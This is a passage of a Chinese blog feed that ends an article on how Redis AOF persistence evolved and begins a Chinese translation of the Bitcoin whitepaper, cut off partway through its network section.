中的数据写盘，主线程同步写盘；</li><li>数据写盘后，需要按照不同的刷盘策略将数据实际落盘，不同的刷盘策略为：<ul><li>AOF_FSYNC_NO ： 不主动执行 fsync ，依靠操作系统的刷盘逻辑；</li><li>AOF_FSYNC_ALWAYS ： 尝试每次写盘后都执行 fsync ；</li><li>AOF_FSYNC_EVERYSEC ：尝试每秒执行一次 fsync ；</li></ul></li></ul></li><li><p>重写持久化流程：</p><ul><li>主线程创建一批管道，用于父子进程的通信；</li><li>主线程 fork 一个子进程执行持久化流程；</li><li>主线程开始堆积增量的 AOF 数据（ aofRewriteBufferAppend 函数）；</li><li>子进程打开一个  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件，准备持久化内存中的数据；</li><li>子进程启用一些 Module 相关的事件消息通知机制；</li><li>子进程按照 RESP协议的持久化不同数据类型的数据，相关持久化规则为：<ul><li>当出现 DB 切换后，会拼接一个 SELECT 命令到 AOF 中；</li><li>OBJ_STRING 数据类型转换为一个 SET 命令；</li><li>OBJ_LIST 数据类型转换为一个或多个 RPUSH 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_SET 数据类型转换为一个或多个 SADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_ZSET 数据类型转换为一个或多个 ZADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_HASH 数据类型转换为一个或多个 HMSET 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>带有过期属性的数据转换为一个 PEXPIREAT 命令；</li></ul></li><li>子进程在持久化数据时定期从父进程的通信管道中读取增量的变更命令，并将其存储到 server.aof_child_diff 中；</li><li>子进程通知父进程停止传输增量的变更命令，之后将管道中未读取的变更命令读取完毕后追加到 server.aof_child_diff 中；</li><li>子进程将获取到的父进程传输的增量变更命令全部记录到当前持久化的 AOF 中；</li><li>子进程将  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件重命名为 <code>temp-rewriteaof-bg-$pid.aof</code> ；</li><li>父进程打开 <code>temp-rewriteaof-bg-$pid.aof</code> 文件，并将未同步给子进程的堆积的增量命令追到到 AOF 中；</li><li>父进程将 <code>temp-rewriteaof-bg-$pid.aof</code>  重命名为配置的 AOF 名称；</li></ul></li></ul><p><img src="/assets/images/redis-persistence-rewriteaof2.png" alt="RewriteAOF优化版流程" loading="lazy"></p><h2 id="3-3、Preamble-RDB-In-AOF-方案"><a href="#3-3、Preamble-RDB-In-AOF-方案" class="headerlink" title="3.3、Preamble RDB In AOF 方案"></a>3.3、Preamble RDB In AOF 方案</h2><ul><li><p>版本范围：4.0.0 ～ 6.2.7（以下分析基于 6.2.7 版本）</p></li><li><p>版本特点（仅关注AOF持久化流程的特点）：</p><ul><li>SET 相关命令的持久化格式优化；</li><li>AOF 中支持带有 RDB 格式的数据前缀，可用于压缩 Rewrite 之后的 AOF 大小；</li></ul></li><li><p>追加持久化流程：</p><ul><li>Redis 执行完成相关命令后，按需将命令格式化追加到 server.aof_buf ，RESP 数据格式化规则：<ul><li>当出现 DB 切换后，会主动写一个 SELECT 命令到 AOF 中；</li><li>当执行 EXPIRE&#x2F;PEXPIRE&#x2F;EXPIREAT 时，会持久化为 PEXPIREAT 命令；</li><li>当执行的 SET 命令带有 PX 参数时，持久化的 SET 带有 PXAT 参数；</li></ul></li><li>Redis 定时将 server.aof_buf 中的数据写盘，主线程同步写盘；</li><li>数据写盘后，需要按照不同的刷盘策略将数据实际落盘，不同的刷盘策略为：<ul><li>AOF_FSYNC_NO ： 不主动执行 fsync ，依靠操作系统的刷盘逻辑；</li><li>AOF_FSYNC_ALWAYS ： 尝试每次写盘后都执行 fsync ；</li><li>AOF_FSYNC_EVERYSEC ：尝试每秒执行一次 fsync ；</li></ul></li></ul></li><li><p>重写持久化流程：</p><ul><li><p>主线程创建一批管道，用于父子进程的通信；</p></li><li><p>主线程 fork 一个子进程执行持久化流程；</p></li><li><p>主线程开始堆积增量的 AOF 数据（ aofRewriteBufferAppend 函数）；</p></li><li><p>子进程设置自己的 OOM Score ，特定的信号处理函数，绑定执行CPU （ server.aof_rewrite_cpulist ）；</p></li><li><p>子进程打开一个  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件，准备持久化内存中的数据；</p></li><li><p>子进程启用一些 Module 相关的事件消息通知机制；</p></li><li><p>子进程 rewrite 的 AOF 格式有两种情况：</p><ul><li>前部分格式为 RDB ，后半部分为 RESP 规范的 AOF 格式（ server.aof_use_rdb_preamble ）： <ul><li>按照 RDB 的格式持久化内存中的数据，并在持久化时不断通知父进程已经持久化的 Key 的数量信息；</li><li>持久化时按需间歇执行 fflush 刷新数据到硬盘；</li></ul></li><li>全部为 RESP 规范的 AOF 格式：则持久化不同数据类型的数据，并按需间歇执行 fflush 刷新数据到硬盘，相关持久化规则为：<ul><li>当出现 DB 切换后，会拼接一个 SELECT 命令到 AOF 中；</li><li>OBJ_STRING 数据类型转换为一个 SET 命令；</li><li>OBJ_LIST 数据类型转换为一个或多个 RPUSH 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_SET 数据类型转换为一个或多个 SADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_ZSET 数据类型转换为一个或多个 ZADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_HASH 数据类型转换为一个或多个 HMSET 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_STREAM 数据类型转换为 XADD &#x2F; XSETID &#x2F; XGROUP 一批命令；</li><li>OBJ_MODULE 数据类型转换为自定义的 Rewrite 命令；</li><li>带有过期属性的数据转换为一个 PEXPIREAT 命令；</li></ul></li></ul></li><li><p>子进程定期从父进程的通信管道中读取增量的变更命令，并将其存储到 server.aof_child_diff 中；</p></li><li><p>子进程通知父进程停止传输增量的变更命令，之后将管道中未读取的变更命令读取完毕后追加到 server.aof_child_diff 中；</p></li><li><p>子进程将获取到的父进程传输的增量变更命令全部记录到当前持久化的 AOF 中；</p></li><li><p>子进程将  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件重命名为 <code>temp-rewriteaof-bg-$pid.aof</code> ；</p></li><li><p>父进程打开 <code>temp-rewriteaof-bg-$pid.aof</code> 文件，并将未同步给子进程的堆积的增量命令追到到 AOF 中；</p></li><li><p>父进程将 <code>temp-rewriteaof-bg-$pid.aof</code>  重命名为配置的 AOF 名称；</p></li></ul></li></ul><p><img src="/assets/images/redis-persistence-aof-preamble.png" alt="AOF中含有RDB格式的持久化流程" loading="lazy"></p><h2 id="3-4、Multi-Part-AOF-方案"><a href="#3-4、Multi-Part-AOF-方案" class="headerlink" title="3.4、Multi Part AOF 方案"></a>3.4、Multi Part AOF 方案</h2><ul><li><p>版本范围：7.0.0 ～ 7.0.5（以下分析基于 7.0.5 版本）</p></li><li><p>版本特点（仅关注AOF持久化流程的特点）：</p><ul><li>统一 Backlog 和 AOF 中的变更命令格式，解决了老版本中由于要格式化命令导致的两者中数据不一致的问题；</li><li>支持多 AOF 数据结构，减少父子进程间传输增量命令的开销；</li><li>新支持命令时间戳注释；</li></ul></li><li><p>追加持久化流程：</p><ul><li>Redis 执行完成相关命令后，按需将命令格式化追加到 server.aof_buf 中 （ alsoPropagate 函数来统一格式）；</li><li>Redis 定时将 server.aof_buf 中的数据写盘，主线程同步写盘；</li><li>数据写盘后，需要按照不同的刷盘策略将数据实际落盘，不同的刷盘策略为：<ul><li>AOF_FSYNC_NO ： 不主动执行 fsync ，依靠操作系统的刷盘逻辑；</li><li>AOF_FSYNC_ALWAYS ： 尝试每次写盘后都执行 fsync ；</li><li>AOF_FSYNC_EVERYSEC ：尝试每秒执行一次 fsync ；</li></ul></li></ul></li><li><p>数据文件：</p><ul><li><code>$aofname.manifest</code> ： 记录本地有效 AOF 列表的元数据文件；</li><li><code>$aofname.$base_seq_file_id.base.rdb</code> ： Rewrite 过程中子进程生成的基础 AOF 文件；</li><li><code>$aofname.$incr_seq_file_id.incr.aof</code> ： Rewrite 过程中父进程生成的增量 AOF 文件；</li></ul></li><li><p>重写持久化流程：</p><ul><li>主线程创建 AOF 所在的目录 （ server.aof_dirname ）；</li><li>主线程打开需要存储增量写入的新的 AOF 文件；</li><li>主线程更新 manifest 文件；</li><li>主线程调用 fork 生成一个子进程，子进程执行数据持久化的逻辑；</li><li>子进程设置自己的 OOM Score ，特定的信号处理函数，绑定执行CPU （ server.aof_rewrite_cpulist ）；</li><li>子进程释放冗余的内存占用，避免 CoW 的开销；</li><li>子进程打开一个  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件，准备持久化内存中的数据；</li><li>子进程启用一些 Module 相关的事件消息通知机制；</li><li>子进程 rewrite 的 AOF 格式有两种情况：<ul><li>前部分格式为 RDB ，后半部分为 RESP 规范的 AOF 格式（ server.aof_use_rdb_preamble ）： <ul><li>按照 RDB 的格式持久化内存中的数据，并在持久化时不断通知父进程已经持久化的 Key 的数量信息；</li><li>持久化时按需间歇执行 fflush 刷新数据到硬盘；</li></ul></li><li>全部为 RESP 规范的 AOF 格式：则持久化不同数据类型的数据，并按需间歇执行 fflush 刷新数据到硬盘，相关持久化规则为：<ul><li>当出现 DB 切换后，会拼接一个 SELECT 命令到 AOF 中；</li><li>OBJ_STRING 数据类型转换为一个 SET 命令；</li><li>OBJ_LIST 数据类型转换为一个或多个 RPUSH 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_SET 数据类型转换为一个或多个 SADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_ZSET 数据类型转换为一个或多个 ZADD 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_HASH 数据类型转换为一个或多个 HMSET 命令 （默认每 64 个数据项拆分为一个命令）；</li><li>OBJ_STREAM 数据类型转换为 XADD &#x2F; XSETID &#x2F; XGROUP 等一批命令；</li><li>OBJ_MODULE 数据类型转换为自定义的 Rewrite 命令；</li><li>带有过期属性的数据转换为一个 PEXPIREAT 命令；</li></ul></li></ul></li><li>子进程持久化过程中间歇向父进程汇报已经处理的 Key 的数量信息；</li><li>子进程调用 fflush 和 fsync 刷新缓存数据；</li><li>子进程将  <code>temp-rewriteaof-$pid.aof</code> 临时 aof 文件重命名为 <code>temp-rewriteaof-bg-$pid.aof</code> ；</li><li>子进程向父进程汇报 CoW 内存的使用情况；</li><li>父进程读取 manifest 获取持久化相关信息，并开发下一个期望的 base 的 AOF；</li><li>父进程将  <code>temp-rewriteaof-bg-$pid.aof</code>  文件重命名为 下一个 base 的 AOF ；</li><li>父进程更新 manifest 文件中记录的元信息，并清理无用的历史 AOF ；</li></ul></li></ul><p><img src="/assets/images/redis-persistence-multi-part-aof.png" alt="MultiPartAOF 重写流程" loading="lazy"></p><h1 id="四、奇思妙想"><a href="#四、奇思妙想" class="headerlink" title="四、奇思妙想"></a>四、奇思妙想</h1><h2 id="4-1、异步写-AOF-方案"><a href="#4-1、异步写-AOF-方案" class="headerlink" title="4.1、异步写 AOF 方案"></a>4.1、异步写 AOF 方案</h2><p>Redis 社区版本目前仅支持主线程同步写 AOF 的操作，在写入量较大以及磁盘性能较差的场景中很容易出现写耗时的抖动问题，为此很多使用 Redis 的厂商都定制了异步写 AOF 的方案，这里介绍一种比较典型的实现方案。</p><ul><li>方案设计：<ul><li>内存中维护一个队列，用于记录用户所有的写入请求，RESP 格式兼容所有写操作（使用 Redis 的 BIO 任务队列也可以）；</li><li>后台线程不断消费该队列中的数据，并将其持久化到本地的 AOF 中（可以使用现有的 BIO 线程进行消费）；</li></ul></li><li>关键点处理：<ul><li>队列的大小限制：可通过自定义的配置限制队列的内存大小，避免出现数据丢失的风险；</li><li>后台线程写 AOF 失败的处理：<ul><li>思路一：后台线程写 AOF 失败后跳过，继续写下一个。这样就不保证 AOF 中数据的可靠性，适用于纯缓存的场景；同时可记录一些关键指标，用于监控失败的次数，失败的命令等信息；</li><li>思路二：后台线程写 AOF 失败后通知主线程（原子变量），并不断重试，直到写入成功。这样能够保证 AOF 中数据的可靠性，但是当磁盘出现异常的场景下，很容易由于队列内存堆积导致实例内存增长，或者在限制内存大小的情况下触发队列满的另一个处理场景。</li></ul></li><li>内存中的队列到达限制之后的处理（例如到达内存的约束值）：（有些时候需要根据线上具体监控指标来选择哪种实现方式）<ul><li>思路一：禁写，快速失败。这能够保证服务的单次访问耗时，但是需要客户端能够处理这种错误，否则就有可能业务频发请求出现访问量暴涨的情况。这种方案通常适用于业务对于访问耗时要求极高，并且有很好的错误处理机制。</li><li>思路二：阻塞等待队列中数据消费到阈值以下。这种方式不可避免的就会影响单次访问的耗时，并且会拉大整体的长尾访问耗时。如果线上机器磁盘很好，且几乎没有出现过异常，并且业务的写入流量不是持续高峰，可能只是瞬时的出现高峰，并且业务也能够接受短暂的访问耗时增加，这种方式对业务来说可能会更加友好。</li></ul></li></ul></li></ul><h2 id="4-2、定制特征-AOF-方案"><a href="#4-2、定制特征-AOF-方案" class="headerlink" title="4.2、定制特征 AOF 方案"></a>4.2、定制特征 AOF 方案</h2><p>Redis 7.0.0 中支持了一种 AOF 中的注释格式，当前应该是只实现了关于时间戳的注释，用于记录在持久化数据时对应命令的执行时间，可用作于按时间点追溯的需求。同理，我们也可以基于这种注释的方式来应对更加丰富的场景。</p><h3 id="4-2-1、按时间点追溯场景"><a href="#4-2-1、按时间点追溯场景" class="headerlink" title="4.2.1、按时间点追溯场景"></a>4.2.1、按时间点追溯场景</h3><ul><li>方案设计：<ul><li>在开启 AOF 持久化的情况下开启 server.aof_timestamp_enabled 配置，保证每条持久化的命令前都附带对应的操作时间戳；</li></ul></li><li>注意点：<ul><li>如果按照当前社区版本中的实现，在执行了 RewriteAOF 之后，AOF 中记录的时间戳就会丢失，失去了指令级的时间信息；</li></ul></li></ul><h3 id="4-2-2、写入链路追踪"><a href="#4-2-2、写入链路追踪" class="headerlink" title="4.2.2、写入链路追踪"></a>4.2.2、写入链路追踪</h3><ul><li>方案设计：<ul><li>在注释的信息中添加 IP 以及操作者信息，用于追溯数据的写入源，可用于快速定位问题，排查异常流量；</li></ul></li><li>注意点：<ul><li>加入这些信息之后会导致 AOF 大小增量变大，同时 RewriteAOF 之后信息丢失；</li></ul></li></ul><h2 id="4-3、RDB-AOF-混合持久化方案"><a href="#4-3、RDB-AOF-混合持久化方案" class="headerlink" title="4.3、RDB + AOF 混合持久化方案"></a>4.3、RDB + AOF 混合持久化方案</h2><p>在 Redis 的 MultiPartAOF 模式下，如果启用了在 AOF 文件中持久化 RDB 格式的数据，这其实也可以理解为一种 RDB + AOF 的混合持久化方案。基本的思路都是存量 + 增量的数据持久化模型。这里介绍另外一种独特的实现方案。</p><ul><li><p>方案设计：</p><ul><li>基于存量 + 增量的数据持久化模型，将 RDB 数据文件作为存量数据存储，将 AOF 数据作为增量数据存储；</li><li>RDB 和 AOF 的数据已某种关系关联一起，实现数据加载的连续以及安全性；</li><li>将 AOF 拆分成多个固化的 AOF 文件，不会对其执行 RewriteAOF 操作，本地数据盘中最终会形成多个有序的 AOF ；</li></ul></li><li><p>数据持久化特点：</p><ul><li>AOF持久化：<ul><li>使用当前的增量数据持久化的流程，必要时可以支持异步落盘；</li><li>设定单个 AOF 文件的阈值，达到阈值后启用下一个 AOF 文件，固化先前的 AOF 数据内容；</li><li>控制整体 AOF 文件数据的大小，避免占用较大的硬盘空间，必要时主动删除最老的 AOF 文件；</li></ul></li><li>RDB持久化：<ul><li>使用现有的 bgsave 持久化方式，保存的数据与先前无异；</li><li>并额外持久化了一些 AOF 相关的信息：包括当前对应的AOF名称，数据偏移量，操作的DBID，从而保证数据加载安全性；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-persistence-rdb-and-aof.png" alt="RDB + AOF 混合持久化模型" loading="lazy"></p><h2 id="4-4、RDB-Forkless-持久化方案"><a href="#4-4、RDB-Forkless-持久化方案" class="headerlink" title="4.4、RDB Forkless 持久化方案"></a>4.4、RDB Forkless 持久化方案</h2><p>以上讨论了很多持久化的方式，全部都需要调用 fork 利用子进程来进行持久化的工作。fork 也不可避免的会导致进程的内存使用增长，Redis 7.0.0 中也做了一些工作，尽可能的想要减少 CoW 导致的内存开销。换个思维去想一下，Redis 能否不通过 fork 来进行数据的持久化，业界提供了一种新的思路： Forkless 方案。</p><ul><li>方案设计：<ul><li>利用 Redis 提供的迭代字典数据的思想来实现对已有数据的持久化；</li><li>锁定字典的状态，禁止执行 Rehash 操作；</li><li>使用单独线程，按照哈希表的下标，有序遍历其中的全部数据，然后将所有数据持久化；</li></ul></li><li>字典中哈希下标的分类（考虑遍历过程中的数据变更）：<ul><li>已经遍历的：当前桶中的数据已经被持久化，需要记录该变更命令，遍历完成后将记录的变更命令追加到持久化数据中；</li><li>正在遍历的：拷贝变更冲突的数据；</li><li>还未遍历的：直接执行，后续遍历到时持久化的就是最新的数据；</li></ul></li></ul><p><img src="/assets/images/redis-persistence-forkless-scan-state.png" alt="哈希桶的遍历状态" loading="lazy"></p><ul><li>持久化数据格式（ RDB 数据文件中的格式）：<ul><li>RDB 格式：遍历过程中所有未被修改的数据以这种编码方式进行持久化；</li><li>RESP 格式（ AOF 格式）：遍历过程中所有被修改的数据以 RESP 增量数据的方式进行持久化；</li></ul></li></ul><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul><li><a href="https://mp.weixin.qq.com/s/9pzNddluP93Wt62cYZK5uw">Redis 持久化机制演进与百度智能云的实践</a></li><li><a href="https://time.geekbang.org/qconplus/detail/100110469">百度 Redis 内核深度剖析（极客时间出品）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 演进史 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Bitcoin: A Peer-to-Peer Electronic Cash System</title>
      <link href="/2022/11/16/bitcoin/"/>
      <url>/2022/11/16/bitcoin/</url>
      
        <content type="html"><![CDATA[<div><p><a href="https://bitcoin.org/bitcoin.pdf">《Bitcoin: A Peer-to-Peer Electronic Cash System》</a> 翻译过来是《 比特币：一种点对点的电子现金系统》 ，这篇文章是比特币的发明人中本聪于 2008 年发表的比特币白皮书。这篇文章介绍了比特币的设计背景，讲述了比特币的工作原理，是加密货币，区块链领域必读的一篇文章，其中讲述了很多巧妙的构思。作者翻译水平有限，翻译的语句可能会有一些出入，建议有能力的读者还是去阅读一下原文。</p></div><h2 id="0、摘要"><a href="#0、摘要" class="headerlink" title="0、摘要"></a>0、摘要</h2><p>A purely peer-to-peer version of electronic cash would allow online payments to be sent directly from one party to another without going through a financial institution. Digital signatures provide part of the solution, but the main benefits are lost if a trusted third party is still required to prevent double-spending. We propose a solution to the double-spending problem using a peer-to-peer network. The network timestamps transactions by hashing them into an ongoing chain of hash-based proof-of-work, forming a record that cannot be changed without redoing the proof-of-work. The longest chain not only serves as proof of the sequence of events witnessed, but proof that it came from the largest pool of CPU power. As long as a majority of CPU power is controlled by nodes that are not cooperating to attack the network, they’ll generate the longest chain and outpace attackers. The network itself requires minimal structure. Messages are broadcast on a best effort basis, and nodes can leave and rejoin the network at will, accepting the longest proof-of-work chain as proof of what happened while they were gone.</p><p>本文提出了一种完全通过点对点（对等）技术实现的电子现金系统，它使得在线支付能够直接由一方发起并支付给另外一方，中间不需要通过任何的金融机构。数字签名提供了部分解决方案，但是如果仍然需要第三方的支持才能防止双重支付的话，那么这种系统也就失去了存在的价值。 我们提出了一种使用对等网络来解决双重支付问题的方法。该网络通过随机散列对全部交易加上时间戳， 将它们合并入一个不断延伸的基于随机散列的工作量证明的链条上作为交易记录，除非重新完成全部的工作量证明，否则已经形成的交易记录将不可更改。最长的链不仅可以证明所见证的事件顺序，还可以证明它来自最大的 CPU 算力池。只要大部分的 CPU 计算能力没有打算合作起来对全网进行攻击，那么它们就会生成最长的链并超过攻击者。这个网络本身需要的结构非常少。信息尽最大努力在全网广播，节点可以随意离开和重新加入网络，并接受最长的工作量证明链作为他们离开时发生的事情的证明。</p><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Commerce on the Internet has come to rely almost exclusively on financial institutions serving as trusted third parties to process electronic payments. While the system works well enough for most transactions, it still suffers from the inherent weaknesses of the trust based model. Completely non-reversible transactions are not really possible, since financial institutions cannot avoid mediating disputes. The cost of mediation increases transaction costs, limiting the minimum practical transaction size and cutting off the possibility for small casual transactions, and there is a broader cost in the loss of ability to make non-reversible payments for nonreversible services. With the possibility of reversal, the need for trust spreads. Merchants must be wary of their customers, hassling them for more information than they would otherwise need. A certain percentage of fraud is accepted as unavoidable. These costs and payment uncertainties can be avoided in person by using physical currency, but no mechanism exists to make payments over a communications channel without a trusted party.</p><p>互联网上的贸易几乎完全依赖于可信赖的第三方金融机构来处理电子支付信息。尽管该系统在大多数交易情况下都运行良好，但它仍然受限于基于信任的模型的固有弱点的约束。我们无法实现完全不可逆的交易，因为金融机构总是不可避免地会出面协调争端。调解开销增加了交易的成本，并限制了最小实际交易规模，也限制了小额临时交易的可能性，更大的问题在于失去了为不可逆服务进行不可逆支付的能力。因为有潜在的退款的可能性，因此需要提高交易双方的信任度。而商家就必须时刻提防着自己的客户，因此就会向客户索取他们本来不需要的个人信息。商业行为中一定比例的欺诈通常是不可避免的。这些成本和支付的不确定性可以通过使用实物货币来避免，但是不存在在没有可信方的情况下使用通信渠道进行支付的机制。</p><p>What is needed is an electronic payment system based on cryptographic proof instead of trust, allowing any two willing parties to transact directly with each other without the need for a trusted third party. Transactions that are computationally impractical to reverse would protect sellers from fraud, and routine escrow mechanisms could easily be implemented to protect buyers. In this paper, we propose a solution to the double-spending problem using a peer-to-peer distributed timestamp server to generate computational proof of the chronological order of transactions. The system is secure as long as honest nodes collectively control more CPU power than any cooperating group of attacker nodes.</p><p>所以我们需要的是一种基于密码证明而非信任的电子支付系统，它允许任何的双方自愿与对方进行交易，而无需受信任的第三方。在计算上无法逆转（无法回退）的交易将保护卖家免受欺诈，并且使用常规的合约机制也可以来保护买家。在本文中，我们提出了一种通过使用点对点分布式时间戳服务器生成有序时间的电子交易证明来解决双重支出问题的方法。只要诚实的节点所控制的计算能力的总和，大于任何合作的攻击者计算能力的总和，该系统就是安全的。</p><h2 id="2、交易"><a href="#2、交易" class="headerlink" title="2、交易"></a>2、交易</h2><p>We define an electronic coin as a chain of digital signatures. Each owner transfers the coin to the next by digitally signing a hash of the previous transaction and the public key of the next owner and adding these to the end of the coin. A payee can verify the signatures to verify the chain of ownership.</p><p>我们定义一枚电子硬币就是一个数字签名链。每个所有者通过对先前交易的哈希值和下一个所有者的公钥进行数字签名并将它们添加到硬币的末尾来将硬币转移到下一位所有者。收款者可以校验签名从而验证链的所有权。</p><div><p><img src="/assets/images/bitcoin-1.png" loading="lazy"></p></div><p>The problem of course is the payee can’t verify that one of the owners did not double-spend the coin. A common solution is to introduce a trusted central authority, or mint, that checks every transaction for double spending. After each transaction, the coin must be returned to the mint to issue a new coin, and only coins issued directly from the mint are trusted not to be double-spent. The problem with this solution is that the fate of the entire money system depends on the company running the mint, with every transaction having to go through them, just like a bank.</p><p>该问题的关键在于，收款人很难校验之前的某位所有者是否对这枚电子货币进行了双重支付。通常的解决方案是引入信得过的类似于造币厂的第三方权威机构，它会检查每笔交易是否存在双重支付。每次交易后，必须将币返还给造币厂并发行新币，只有造币厂直接发行的币才可信，这样能够防止双重支付。这个解决方案的问题在于，整个货币系统的命运依赖于运作造币厂的公司，因为每一笔交易都要经过它们，（造币厂）就像银行一样。</p><p>We need a way for the payee to know that the previous owners did not sign any earlier transactions. For our purposes, the earliest transaction is the one that counts, so we don’t care about later attempts to double-spend. The only way to confirm the absence of a transaction is to be aware of all transactions. In the mint based model, the mint was aware of all transactions and decided which arrived first. To accomplish this without a trusted party, transactions must be publicly announced [1], and we need a system for participants to agree on a single history of the order in which they were received. The payee needs proof that at the time of each transaction, the majority of nodes agreed it was the first received.</p><p>我们需要一种方法让收款人知道以前的所有者没有签署任何早期的交易。就我们的目的而言，最早的交易才是最重要的，因此我们不关心之后的操作是否存在双重支付。确认一个不存在的交易的唯一方法是了解所有的交易。在造币厂模型中，造币厂知道所有的交易，并且决定交易的先后顺序。为了在没有受信任的第三方的情况下实现这一点，交易必须公开宣布 [1] ，我们需要一个系统让参与者就收到交易的顺序的单一历史达成一致。收款人需要证明在每次交易时，大多数的节点都同意它是第一个收到的。</p><h2 id="3、时间戳服务器"><a href="#3、时间戳服务器" class="headerlink" title="3、时间戳服务器"></a>3、时间戳服务器</h2><p>The solution we propose begins with a timestamp server. A timestamp server works by taking a hash of a block of items to be timestamped and widely publishing the hash, such as in a newspaper or Usenet post [2-5]. The timestamp proves that the data must have existed at the time, obviously, in order to get into the hash. Each timestamp includes the previous timestamp in its hash, forming a chain, with each additional timestamp reinforcing the ones before it.</p><p>我们提出的解决方案开始于时间戳服务器。时间戳的工作原理是获取要加盖时间戳的项目块的散列值，并广泛发布该散列值，例如在报纸或者 Usenet 中发帖 [2-5]。时间戳证明了数据在对应时刻是一定存在的，因此才能获取到对应的随机散列值。每个时间戳都在其哈希值中包含前一个时间戳，之后每一个时间戳都会加强它之前的时间戳，这就形成了一个链条。</p><div><p><img src="/assets/images/bitcoin-2.png" loading="lazy"></p></div><h2 id="4、工作证明"><a href="#4、工作证明" class="headerlink" title="4、工作证明"></a>4、工作证明</h2><p>To implement a distributed timestamp server on a peer-to-peer basis, we will need to use a proof-of-work system similar to Adam Back’s Hashcash [6], rather than newspaper or Usenet posts. The proof-of-work involves scanning for a value that when hashed, such as with SHA-256, the hash begins with a number of zero bits. The average work required is exponential in the number of zero bits required and can be verified by executing a single hash.</p><p>为了在点对点（对等）的基础上构建分布式的时间戳服务器，我们需要使用类似于 Adam Back 的 哈希现金（Hashcash） [6] 的工作证明系统，而不是像报纸或 Usenet 的帖子。工作量证明涉及到扫描一个散列后的值，该值在散列时（例如使用 SHA-256 ）以多个零位开始。所需的平均工作量与所需的零位数量成指数关系，并且可以通过执行单个散列来进行验证。</p><p>For our timestamp network, we implement the proof-of-work by incrementing a nonce in the block until a value is found that gives the block’s hash the required zero bits. Once the CPU effort has been expended to make it satisfy the proof-of-work, the block cannot be changed without redoing the work. As later blocks are chained after it, the work to change the block would include redoing all the blocks after it.</p><p>对于我们的时间戳网络，我们能通过在块中随机增加一个随机数并且直到找到对应块散列所需要的零位的方式来实现了工作证明。只要该 CPU 耗费的工作量能够满足该工作量证明机制，那么除非重新完成相当的工作量，该区块的信息就不可更改。由于之后的块是被链接在该区块之后的，因此想要更改该区块中的信息就还需要重做之后所有区块的全部工作量。</p><div><p><img src="/assets/images/bitcoin-3.png" loading="lazy"></p></div><p>The proof-of-work also solves the problem of determining representation in majority decision making. If the majority were based on one-IP-address-one-vote, it could be subverted by anyone able to allocate many IPs. Proof-of-work is essentially one-CPU-one-vote. The majority decision is represented by the longest chain, which has the greatest proof-of-work effort invested in it. If a majority of CPU power is controlled by honest nodes, the honest chain will grow the fastest and outpace any competing chains. To modify a past block, an attacker would have to redo the proof-of-work of the block and all blocks after it and then catch up with and surpass the work of the honest nodes. We will show later that the probability of a slower attacker catching up diminishes exponentially as subsequent blocks are added.</p><p>工作量证明还解决了在决策中确定大多数的问题。如果决定大多数的方式是基于 IP 地址的，一个 IP 地址一票，那么如果有人拥有分配大量 IP地址的权利，则该机制就会被破坏了。工作量证明本质上是一个 CPU 一票。多数决定由最长的链来确定，因为最长的链中包含了最大的工作量。如果大多数 CPU 能力由诚实的节点控制，那么诚实链将增长的最快并超过任何的竞争链。要修改过去的区块，攻击者必须重做该区块及后所有区块的工作量证明，然后赶上并超越诚实节点的工作量。稍后我们将展示，随着后续块的添加，较慢的攻击者能够赶上的概率将呈指数下降。</p><p>To compensate for increasing hardware speed and varying interest in running nodes over time, the proof-of-work difficulty is determined by a moving average targeting an average number of blocks per hour. If they’re generated too fast, the difficulty increases.</p><p>为了补偿不断增加的硬件速度和参与网络计算节点的数量波动，工作量证明的难度将由移动的平均线决定，其目标是每小时的平均块数。如果区块生成的速度过快，那么难度就会提高。</p><h2 id="5、网络"><a href="#5、网络" class="headerlink" title="5、网络"></a>5、网络</h2><p>The steps to run the network are as follows:</p><p>运行该网络的步骤如下：</p><ol><li>New transactions are broadcast to all nodes.</li><li>Each node collects new transactions into a block.</li><li>Each node works on finding a difficult proof-of-work for its block.</li><li>When a node finds a proof-of-work, it broadcasts the block to all nodes.</li><li>Nodes accept the block only if all transactions in it are valid and not already spent.</li><li>Nodes express their acceptance of the block by working on creating the next block in the chain, using the hash of the accepted block as the previous hash.</li></ol><br /><ol><li>新的交易向全部节点进行广播；</li><li>每一个节点都将收到的交易信息纳入一个区块中；</li><li>每个节点都尝试在自己的区块中找到一个具有足够难度的工作量证明；</li><li>当一个节点找到了一个工作量证明，它就会广播给全部节点；</li><li>当且仅当包含在该区块中的所有交易都是有效的并且之前没有存在过，其他节点才会认同该区块的有效性；</li><li>其他节点表示它们接受该区块，并在跟随该区块的末尾制造出新的区块来延长该链条，使用已经接收到的散列值作为新区块的上一个散列值。</li></ol><p>Nodes always consider the longest chain to be the correct one and will keep working on extending it. If two nodes broadcast different versions of the next block simultaneously, some nodes may receive one or the other first. In that case, they work on the first one they received, but save the other branch in case it becomes longer. The tie will be broken when the next proofof-work is found and one branch becomes longer; the nodes that were working on the other branch will then switch to the longer one.</p><p>节点始终认为最长的链是正确的链，并将继续努力扩展它。 如果两个节点同时广播不同版本的新区块，其他节点在接收到该区块的时间上可能有先后的区别。 